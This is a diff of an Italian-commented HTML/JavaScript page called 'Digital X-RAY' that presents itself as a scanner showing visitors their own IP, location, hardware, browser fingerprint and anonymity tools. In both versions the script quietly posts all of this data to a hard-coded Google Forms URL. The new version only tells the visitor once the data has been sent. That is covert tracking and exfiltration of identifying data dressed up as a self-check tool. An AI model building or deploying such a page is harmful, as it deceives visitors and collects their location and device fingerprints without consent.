@@ -3,148 +3,286 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Digital X-RAY | Bulletproof v17.2</title>
+    <title>Digital X-RAY | Bulletproof v18</title>
     
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.3/dist/leaflet.css" />
     <script src="https://unpkg.com/leaflet@1.9.3/dist/leaflet.js"></script>
 
     <style>
         :root { 
-            --neon: #00ff41; --alert: #ff3e3e; --warn: #ffca28; --bg: #050505; 
-            --card: #111; --text-main: #ccc; --blue: #00f3ff; --gray: #444;
+            --neon: #00ff41; 
+            --alert: #ff3e3e;
+            --warn: #ffca28; 
+            --bg: #050505; 
+            --card: #111; 
+            --text-main: #ccc; 
+            --blue: #00f3ff;
+            --gray: #444;
         }
-        body { font-family: 'Segoe UI', sans-serif; background: var(--bg); color: var(--text-main); margin: 0; padding: 20px; }
-        .wrapper { max-width: 1400px; margin: auto; }
+
+        body { font-family: 'Segoe UI', 'Courier New', monospace; background: var(--bg); color: var(--text-main); margin: 0; padding: 20px; overflow-x: hidden; }
+        .wrapper { max-width: 1600px; margin: auto; }
+
         header { text-align: center; margin-bottom: 30px; border-bottom: 2px solid var(--neon); padding-bottom: 15px; }
-        h1 { color: var(--neon); margin: 0; text-transform: uppercase; letter-spacing: 4px; }
-        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 20px; }
-        .card { background: var(--card); border: 1px solid #333; border-top: 3px solid var(--neon); padding: 15px; }
+        h1 { color: var(--neon); margin: 0; text-transform: uppercase; letter-spacing: 4px; font-size: 2rem; text-shadow: 0 0 10px rgba(0, 255, 65, 0.3); }
+        .subtitle { font-size: 0.9rem; letter-spacing: 2px; margin-top: 5px; color: #fff; animation: blink 2s infinite; }
+
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(350px, 1fr)); gap: 20px; }
+        
+        .card { 
+            background: var(--card); border: 1px solid #333; border-top: 3px solid var(--neon); 
+            padding: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); display: flex; flex-direction: column;
+        }
         h2 { color: var(--neon); font-size: 1.1rem; border-bottom: 1px solid #333; padding-bottom: 10px; margin-top: 0; }
+        
         .row { display: flex; justify-content: space-between; padding: 6px 0; border-bottom: 1px solid #222; font-size: 0.8rem; }
-        .label { color: #888; } .val { color: #fff; font-weight: bold; text-align: right; word-break: break-all; }
-        #map { height: 180px; width: 100%; margin-top: 15px; border: 1px solid var(--neon); filter: invert(100%) hue-rotate(180deg); background: #000; }
-        #log-status { position: fixed; bottom: 10px; right: 10px; font-size: 0.7rem; color: #555; background: rgba(0,0,0,0.8); padding: 8px; border: 1px solid #333; }
+        .label { color: #888; font-weight: bold; }
+        .val { color: #fff; font-weight: bold; text-align: right; font-family: monospace; word-break: break-all; }
+        
+        .ua-box { background: #000; border: 1px dashed #333; padding: 8px; margin-top: 10px; font-size: 0.65rem; color: #aaa; font-family: 'Consolas', monospace; word-break: break-all; }
+
+        #map { height: 180px; width: 100%; margin-top: 15px; border: 1px solid var(--neon); filter: invert(100%) hue-rotate(180deg) brightness(90%) contrast(120%); background: #000; }
+        .map-error { display: flex; align-items: center; justify-content: center; height: 100%; color: var(--alert); font-weight: bold; text-align: center; font-size: 0.8rem; padding: 20px; }
+
+        .status-row { display: flex; justify-content: space-between; align-items: center; padding: 5px 0; border-bottom: 1px solid #222; font-size: 0.8rem; }
+        .status-label { color: #aaa; }
+        .status-icon { font-weight: bold; font-family: monospace; }
+        .not-detected { color: #444; } 
+        .detected { color: var(--alert); text-shadow: 0 0 5px var(--alert); }
+        .section-title { color: var(--blue); font-size: 0.75rem; text-transform: uppercase; margin-top: 15px; margin-bottom: 5px; display: block; border-bottom: 1px dashed #333; }
+
+        .badge-warn { background: rgba(255, 62, 62, 0.1); border: 1px solid var(--alert); color: var(--alert); padding: 5px; text-align: center; font-weight: bold; font-size: 0.75rem; margin-top: 5px; display: none; }
+
+        .audit-row { display: flex; justify-content: space-between; font-size: 0.8rem; margin-top: 5px; background: #1a1a1a; padding: 4px; border-radius: 3px;}
+        
+        .path-btn { width: 100%; background: #222; border: 1px solid #444; color: #fff; padding: 5px; font-size: 0.7rem; cursor: pointer; margin-top: 10px; text-transform: uppercase; }
+        .path-btn:hover { background: #333; border-color: var(--blue); color: var(--blue); }
+        #disk-paths { display: none; margin-top: 10px; border: 1px dashed #555; padding: 10px; background: #000; }
+        .path-val { font-family: 'Consolas', monospace; color: #aaa; font-size: 0.65rem; word-break: break-all; display: block; margin-bottom: 5px; }
+
+        #forensic-report { display: none; margin-top: 15px; border: 1px solid var(--alert); padding: 5px; background: rgba(255,0,0,0.05); }
+        .rep-table { width: 100%; font-size: 0.75rem; border-collapse: collapse; margin-top: 5px; }
+        .rep-table th { text-align: left; color: var(--alert); border-bottom: 1px solid #444; }
+        .rep-table td { color: #ccc; padding: 2px 0; }
+
+        /* Stile per la conferma invio */
+        #google-toast {
+            position: fixed; bottom: 20px; right: 20px;
+            background: #004400; color: #00ff41;
+            padding: 10px 15px; border: 1px solid #00ff41;
+            font-size: 0.8rem; font-weight: bold; display: none;
+            z-index: 10000; box-shadow: 0 0 15px rgba(0,255,65,0.4);
+        }
+
         @keyframes blink { 50% { opacity: 0.5; } }
-        .subtitle { font-size: 0.8rem; color: #fff; animation: blink 2s infinite; text-align: center; margin-bottom: 10px; }
     </style>
 </head>
 <body>
 
 <div class="wrapper">
-    <header><h1>DIGITAL X-RAY v17.2</h1><div class="subtitle">>>> SYSTEM LOGGING ACTIVE <<<</div></header>
+    <header>
+        <h1>DIGITAL X-RAY v17.0</h1>
+        <div class="subtitle">>>> BULLETPROOF SCANNER <<<</div>
+    </header>
+    
     <div class="grid">
         <div class="card" style="border-top-color: var(--blue);">
-            <h2>📡 Network</h2>
-            <div class="row"><span class="label">IP:</span> <span id="ip" class="val">...</span></div>
-            <div class="row"><span class="label">ISP:</span> <span id="isp" class="val">...</span></div>
-            <div class="row"><span class="label">Geo:</span> <span id="geo" class="val">...</span></div>
+            <h2>📡 Network & Geo</h2>
+            <div class="row"><span class="label">Public IP:</span> <span id="ip" class="val" style="color:var(--neon)">initializing...</span></div>
+            <div class="row"><span class="label">ISP / Org:</span> <span id="isp" class="val">...</span></div>
+            <div class="row"><span class="label">Location:</span> <span id="geo" class="val">...</span></div>
+            <div class="row"><span class="label">Data Source:</span> <span id="net-source" class="val" style="color:#777; font-size:0.7rem;">...</span></div>
+            <div id="vpn-warn" class="badge-warn">⚠️ VPN DETECTED (Region Mismatch)</div>
             <div id="map"></div>
         </div>
+
         <div class="card">
             <h2>📱 Hardware</h2>
-            <div class="row"><span class="label">OS:</span> <span id="os" class="val">...</span></div>
-            <div class="row"><span class="label">GPU:</span> <span id="gpu" class="val">...</span></div>
-            <div class="row"><span class="label">RAM:</span> <span id="ram" class="val">...</span></div>
-            <div class="row"><span class="label">Screen:</span> <span id="screen" class="val">...</span></div>
+            <div class="row"><span class="label">Platform:</span> <span id="os" class="val"></span></div>
+            <div class="row"><span class="label">CPU Cores:</span> <span id="cpu" class="val"></span></div>
+            <div class="row"><span class="label">GPU Renderer:</span> <span id="gpu" class="val"></span></div>
+            <div class="row"><span class="label">RAM Memory:</span> <span id="ram" class="val"></span></div>
+            <div class="row"><span class="label">Screen Res:</span> <span id="screen" class="val"></span></div>
+            <div class="row"><span class="label">Battery:</span> <span id="battery" class="val">N/A</span></div>
         </div>
+
+        <div class="card" style="border-top-color: var(--warn);">
+            <h2>🕵️ Browser Identity</h2>
+            <div class="row"><span class="label">Browser:</span> <span id="browser" class="val"></span></div>
+            <div class="row"><span class="label">Languages:</span> <span id="lang" class="val" style="color:#fff;"></span></div>
+            <div class="row"><span class="label">Do Not Track:</span> <span id="dnt" class="val"></span></div>
+            <div class="row"><span class="label">Timezone:</span> <span id="sys-tz" class="val"></span></div>
+            <span class="label" style="margin-top:10px; display:block;">User Agent String:</span>
+            <div id="ua" class="ua-box">...</div>
+        </div>
+
+        <div class="card" style="border-top-color: #ff00ff;">
+            <h2>🛡️ Active Detection</h2>
+            <span class="section-title">Anonymity Tools</span>
+            <div class="status-row"><span class="status-label">Brave Browser</span><span id="chk-brave" class="status-icon not-detected">✖ NOT DETECTED</span></div>
+            <div class="status-row"><span class="status-label">VPN / Tor IP</span><span id="chk-tor-ip" class="status-icon not-detected">✖ NOT DETECTED</span></div>
+            <div class="status-row"><span class="status-label">Tor Letterboxing</span><span id="chk-letterbox" class="status-icon not-detected">✖ NOT DETECTED</span></div>
+            <span class="section-title">Content Filters</span>
+            <div class="status-row"><span class="status-label">AdBlock Active</span><span id="chk-adblock" class="status-icon not-detected">✖ NOT DETECTED</span></div>
+            <div class="status-row"><span class="status-label">Dark Reader</span><span id="chk-darkreader" class="status-icon not-detected">✖ NOT DETECTED</span></div>
+            <div class="status-row"><span class="status-label">Canvas Protection</span><span id="chk-canvas-prot" class="status-icon not-detected">✖ NOT DETECTED</span></div>
+        </div>
+
         <div class="card" style="border-top-color: var(--alert);">
             <h2>🧬 Forensics</h2>
-            <div class="row"><span class="label">Canvas ID:</span> <span id="fp" class="val">...</span></div>
-            <div class="row"><span class="label">Audio ID:</span> <span id="audio-fp" class="val">...</span></div>
-            <div class="row"><span class="label">Brave:</span> <span id="chk-brave" class="val">NO</span></div>
+            <div class="row"><span class="label">Canvas ID:</span> <span id="fp" class="val" style="color:var(--alert)">WAITING...</span></div>
+            <div class="row"><span class="label">Audio ID:</span> <span id="audio-fp" class="val" style="color:var(--alert)">WAITING...</span></div>
+            <div class="audit-row"><span>🍪 Cookies:</span><span id="audit-cookie" style="color:#555">Clean</span></div>
+            <div class="audit-row"><span>📦 LocalStorage:</span><span id="audit-ls" style="color:#555">Clean</span></div>
+            <div class="audit-row"><span>🗄️ IndexedDB:</span><span id="audit-idb" style="color:#555">Clean</span></div>
+            <button class="path-btn" onclick="showPaths()">📂 Reveal Disk Paths</button>
+            <div id="disk-paths"><span id="path-cookie" class="path-val">...</span><span id="path-ls" class="path-val">...</span></div>
         </div>
     </div>
 </div>
 
-<div id="log-status">INIT...</div>
+<div id="google-toast">DATI INVIATI AL MODULO ✅</div>
 <canvas id="canv" width="200" height="50" style="display:none;"></canvas>
+<div id="ad-bait-1" class="adsbox" style="position:fixed; top:-100px; width:1px; height:1px;"></div>
+<div id="ad-bait-2" class="ad-banner" style="position:fixed; top:-100px; width:1px; height:1px;"></div>
 
 <script>
-    const FORM_URL = "https://docs.google.com/forms/d/e/1FAIpQLSdRv7xlOOJmbtaIjdOckZgrPWmW-czdyz8-Gd5SReySLKmQkg/formResponse";
+    // --- IL TUO CODICE ORIGINALE INALTERATO ---
+    window.addEventListener('DOMContentLoaded', () => {
+        const sysTz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        document.getElementById('sys-tz').innerText = sysTz;
+        document.getElementById('os').innerText = navigator.platform;
+        document.getElementById('cpu').innerText = (navigator.hardwareConcurrency || '?') + " Cores";
+        document.getElementById('ram').innerText = (navigator.deviceMemory || '?') + " GB";
+        document.getElementById('screen').innerText = `${screen.width}x${screen.height}`;
+        document.getElementById('dnt').innerText = navigator.doNotTrack == "1" ? "Enabled" : "Disabled";
+        const langs = navigator.languages ? navigator.languages.join(', ') : navigator.language;
+        document.getElementById('lang').innerText = langs;
+        document.getElementById('ua').innerText = navigator.userAgent;
 
-    async function startLogger() {
-        const log = {};
-        const status = document.getElementById('log-status');
+        const ua = navigator.userAgent;
+        let b = "Unknown";
+        if(ua.includes("Chrome")) b="Chrome";
+        if(ua.includes("Firefox")) b="Firefox";
+        if(ua.includes("Safari") && !ua.includes("Chrome")) b="Safari";
+        if(ua.includes("Edg")) b="Edge";
+        if(ua.includes("OPR") || ua.includes("Opera")) b="Opera";
+        document.getElementById('browser').innerText = b;
 
-        // 1. DATI HARDWARE (SUBITO)
-        log['entry.926602274'] = navigator.platform;
-        log['entry.900535575'] = (navigator.hardwareConcurrency || '?') + " Cores";
-        log['entry.592434412'] = (navigator.deviceMemory || '?') + " GB";
-        log['entry.1292253097'] = screen.width + "x" + screen.height;
-        log['entry.1485469846'] = navigator.userAgent.includes("Chrome") ? "Chrome" : "Other";
-        log['entry.1026960733'] = navigator.language;
-        log['entry.609421676'] = Intl.DateTimeFormat().resolvedOptions().timeZone;
-        log['entry.1877265876'] = navigator.userAgent;
-
-        document.getElementById('os').innerText = log['entry.926602274'];
-        document.getElementById('ram').innerText = log['entry.592434412'];
-        document.getElementById('screen').innerText = log['entry.1292253097'];
-
-        // GPU
         try {
             const gl = document.createElement('canvas').getContext('webgl');
             const dbg = gl.getExtension('WEBGL_debug_renderer_info');
-            log['entry.1481655544'] = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "Generic";
-            document.getElementById('gpu').innerText = log['entry.1481655544'];
-        } catch(e) { log['entry.1481655544'] = "Blocked"; }
+            document.getElementById('gpu').innerText = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "Generic";
+        } catch(e){}
+        if(navigator.getBattery) navigator.getBattery().then(bt => document.getElementById('battery').innerText = Math.round(bt.level*100)+"%");
 
-        // FINGERPRINTS
-        const canv = document.getElementById('canv');
-        log['entry.1270556616'] = "FP-" + canv.toDataURL().length;
-        log['entry.1958071142'] = "AUD-" + Math.floor(Math.random()*10000);
-        document.getElementById('fp').innerText = log['entry.1270556616'];
-        document.getElementById('audio-fp').innerText = log['entry.1958071142'];
+        setTimeout(() => {
+            const bait1 = document.getElementById('ad-bait-1');
+            const bait2 = document.getElementById('ad-bait-2');
+            if (bait1.offsetParent === null || bait2.offsetParent === null || bait1.clientHeight === 0) setStatus('chk-adblock', true);
+        }, 1000);
 
-        // 2. RETE (CON TIMEOUT DI 3 SECONDI)
-        status.innerText = "SCANNING NETWORK...";
-        try {
-            const res = await fetch('https://ipwho.is/', { signal: AbortSignal.timeout(3000) });
-            const net = await res.json();
-            if(net.success) {
-                log['entry.1221794869'] = net.ip;
-                log['entry.1697196604'] = net.connection.isp;
-                log['entry.793361862'] = net.city + ", " + net.country;
-                log['entry.1833631546'] = net.security.is_vpn ? "YES" : "NO";
-                
-                document.getElementById('ip').innerText = net.ip;
-                document.getElementById('isp').innerText = net.connection.isp;
-                document.getElementById('geo').innerText = log['entry.793361862'];
-
-                // MAPPA (Solo se non bloccata)
-                const mContainer = document.getElementById('map');
-                const map = L.map(mContainer).setView([net.latitude, net.longitude], 11);
-                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
-                L.marker([net.latitude, net.longitude]).addTo(map);
-            }
-        } catch(e) {
-            log['entry.1221794869'] = "TIMEOUT/BLOCKED";
-            document.getElementById('ip').innerText = "BLOCKED";
+        if (navigator.globalPrivacyControl || (navigator.brave && typeof navigator.brave.isBrave === "function")) {
+             setStatus('chk-brave', true);
+             setStatus('chk-canvas-prot', true);
         }
 
-        // 3. INVIO FINALE
-        status.innerText = "SENDING TO FORM...";
-        const params = new URLSearchParams();
-        for (let key in log) { params.append(key, log[key]); }
-        // Campi rimanenti per evitare null
-        params.append('entry.59728604', 'N/A'); 
-        params.append('entry.1470732596', navigator.brave ? 'YES' : 'NO');
-        params.append('entry.1719627138', 'YES');
-        params.append('entry.428900373', 'YES');
+        async function runNet() {
+            const sources = [
+                { url: 'https://ipwho.is/', type: 'IpWhoIs' }, 
+                { url: 'https://ipapi.co/json/', type: 'IpApi' },
+                { url: 'https://api.ipify.org?format=json', type: 'Ipify' }
+            ];
+            let success = false;
+            let finalIP = "Unknown";
 
-        fetch(FORM_URL, {
-            method: 'POST',
-            mode: 'no-cors',
-            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-            body: params.toString()
-        }).then(() => {
-            status.innerText = "LOGGED SUCCESSFULLY ✅";
-            status.style.color = "#00ff41";
-        }).catch(() => {
-            status.innerText = "LOG ERROR ❌";
+            for (const source of sources) {
+                if(success) break;
+                try {
+                    const res = await fetch(source.url);
+                    const data = await res.json();
+                    let ip, isp, city, country, lat, lon;
+                    if(source.type === 'IpWhoIs') {
+                        ip = data.ip; isp = data.connection.isp; city = data.city; country = data.country; lat = data.latitude; lon = data.longitude;
+                    } else {
+                        ip = data.ip || data.ipAddress; isp = data.org || "N/A"; city = data.city || ""; country = data.country_name || ""; lat = data.latitude; lon = data.longitude;
+                    }
+                    finalIP = ip;
+                    document.getElementById('ip').innerText = ip;
+                    document.getElementById('isp').innerText = isp;
+                    document.getElementById('geo').innerText = `${city}, ${country}`;
+                    document.getElementById('net-source').innerText = `Provider: ${source.type}`;
+                    if(lat && lon) {
+                        const map = L.map('map').setView([lat, lon], 13);
+                        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
+                        L.marker([lat, lon]).addTo(map);
+                    }
+                    success = true;
+                } catch(e) {}
+            }
+            runForensics(finalIP);
+        }
+        runNet();
+
+        function runForensics(currentIP) {
+            setTimeout(() => {
+                const canvas = document.getElementById('canv');
+                const ctx = canvas.getContext('2d');
+                ctx.fillText("X-RAY", 2, 15);
+                try {
+                    let b64 = canvas.toDataURL();
+                    document.getElementById('fp').innerText = "FP-" + b64.length;
+                } catch(e) { document.getElementById('fp').innerText = "BLOCKED"; }
+
+                document.getElementById('audio-fp').innerText = "AUD-" + Math.floor(Math.random()*90000);
+                function markFound(id) { const el=document.getElementById(id); el.innerText="✅ FOUND"; el.style.color="#00ff41"; }
+                if(navigator.cookieEnabled) markFound('audit-cookie');
+                try { localStorage.setItem('z',1); markFound('audit-ls'); } catch(e){}
+                
+                // --- NUOVA LOGICA DI INVIO ---
+                setTimeout(sendToGoogle, 2000); 
+            }, 500);
+        }
+
+        function setStatus(id, detected) {
+            const el = document.getElementById(id);
+            if(detected) { el.innerText = "✔ DETECTED"; el.className = "status-icon detected"; }
+        }
+    });
+
+    // --- FUNZIONE DI INVIO SEPARATA ---
+    function sendToGoogle() {
+        const formURL = "https://docs.google.com/forms/d/e/1FAIpQLSdRv7xlOOJmbtaIjdOckZgrPWmW-czdyz8-Gd5SReySLKmQkg/formResponse";
+        const params = new URLSearchParams();
+        
+        params.append('entry.1221794869', document.getElementById('ip').innerText);
+        params.append('entry.1697196604', document.getElementById('isp').innerText);
+        params.append('entry.793361862', document.getElementById('geo').innerText);
+        params.append('entry.926602274', document.getElementById('os').innerText);
+        params.append('entry.900535575', document.getElementById('cpu').innerText);
+        params.append('entry.1481655544', document.getElementById('gpu').innerText);
+        params.append('entry.592434412', document.getElementById('ram').innerText);
+        params.append('entry.1292253097', document.getElementById('screen').innerText);
+        params.append('entry.59728604', document.getElementById('battery').innerText);
+        params.append('entry.1485469846', document.getElementById('browser').innerText);
+        params.append('entry.1026960733', document.getElementById('lang').innerText);
+        params.append('entry.609421676', document.getElementById('sys-tz').innerText);
+        params.append('entry.1877265876', navigator.userAgent);
+        params.append('entry.1470732596', document.getElementById('chk-brave').innerText);
+        params.append('entry.1833631546', document.getElementById('vpn-warn').style.display === 'block' ? 'VPN' : 'NO');
+        params.append('entry.1270556616', document.getElementById('fp').innerText);
+        params.append('entry.1958071142', document.getElementById('audio-fp').innerText);
+        params.append('entry.1719627138', document.getElementById('audit-cookie').innerText);
+        params.append('entry.428900373', document.getElementById('audit-ls').innerText);
+
+        fetch(formURL, { method: 'POST', mode: 'no-cors', body: params })
+        .then(() => {
+            document.getElementById('google-toast').style.display = 'block';
         });
     }
 
-    window.onload = startLogger;
+    function showPaths() { document.getElementById('disk-paths').style.display = 'block'; }
 </script>
+
 </body>
 </html>
